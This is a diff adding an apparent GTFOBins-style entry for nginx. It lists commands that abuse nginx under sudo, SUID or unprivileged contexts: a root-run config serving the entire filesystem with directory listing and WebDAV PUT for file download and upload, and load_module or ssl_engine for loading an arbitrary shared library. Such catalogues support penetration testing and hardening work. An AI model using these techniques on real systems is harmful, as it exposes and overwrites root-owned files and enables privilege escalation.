@@ -1,0 +1,67 @@
+nginx
+=====
+
+Download
+--------
+
+[Sudo]
+    cat >/path/to/temp-file <<EOF
+user root;
+http {
+  server {
+    listen 80;
+    root /;
+    autoindex on;
+    dav_methods PUT;
+  }
+}
+events {}
+EOF
+
+nginx -c /path/to/temp-file
+
+Library load
+------------
+
+[Sudo]
+    cat >/path/to/temp-file <<EOF
+load_module /path/to/lib.so;
+EOF
+
+nginx -t -c /path/to/temp-file
+    Alternatively, the `ssl_engine` directive can be used.
+
+[SUID]
+    cat >/path/to/temp-file <<EOF
+load_module /path/to/lib.so;
+EOF
+
+nginx -t -c /path/to/temp-file
+    Alternatively, the `ssl_engine` directive can be used.
+
+[Unprivileged]
+    cat >/path/to/temp-file <<EOF
+load_module /path/to/lib.so;
+EOF
+
+nginx -t -c /path/to/temp-file
+    Alternatively, the `ssl_engine` directive can be used.
+
+Upload
+------
+
+[Sudo]
+    cat >/path/to/temp-file <<EOF
+user root;
+http {
+  server {
+    listen 80;
+    root /;
+    autoindex on;
+    dav_methods PUT;
+  }
+}
+events {}
+EOF
+
+nginx -c /path/to/temp-file
